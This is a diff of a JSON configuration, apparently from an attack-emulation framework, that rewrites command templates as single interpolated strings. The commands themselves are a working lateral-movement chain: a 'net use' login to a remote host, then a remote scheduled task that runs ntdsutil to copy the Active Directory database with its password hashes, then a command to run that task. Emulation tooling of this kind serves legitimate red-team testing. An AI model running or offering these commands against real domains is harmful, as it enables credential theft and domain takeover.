@@ -151,18 +151,7 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "net use \\\\",
-                            "self.target_2_hostname",
-                            " /User:",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " ",
-                            "self.target_2_password"
-                        ]
-                    }
+                    "command": "net use \\\\${self.target_2_hostname} /User:${self.target_2_username}@${self.domain} ${self.target_2_password}"
                 }
             }
         },
@@ -188,26 +177,7 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ",
-                            "self.target_2_taskname",
-                            " /TR 'c:\\windows\\system32\\ntdsutil.exe \"activate instance ntds\" ifm \"create full c:\\test\" q q'  /RL Highest /U ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /P ",
-                            "self.target_2_password",
-                            " /RU ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /RP ",
-                            "self.target_2_password",
-                            " /S ",
-                            "self.target_2_hostname"
-                        ]
-                    }
+                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.target_2_taskname} /TR 'c:\\windows\\system32\\ntdsutil.exe \"activate instance ntds\" ifm \"create full c:\\test\" q q'  /RL Highest /U ${self.target_2_username}@${self.domain} /P ${self.target_2_password} /RU ${self.target_2_username}@${self.domain} /RP ${self.target_2_password} /S ${self.target_2_hostname}"
                 }
             }
         },
@@ -222,20 +192,7 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd.exe /c schtasks.exe /run /tn ",
-                            "self.target_2_taskname",
-                            " /U ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /P ",
-                            "self.target_2_password",
-                            " /S ",
-                            "self.target_2_hostname"
-                        ]
-                    }
+                    "command": "cmd.exe /c schtasks.exe /run /tn ${self.target_2_taskname} /U ${self.target_2_username}@${self.domain} /P ${self.target_2_password} /S ${self.target_2_hostname}"
                 }
             }
         },
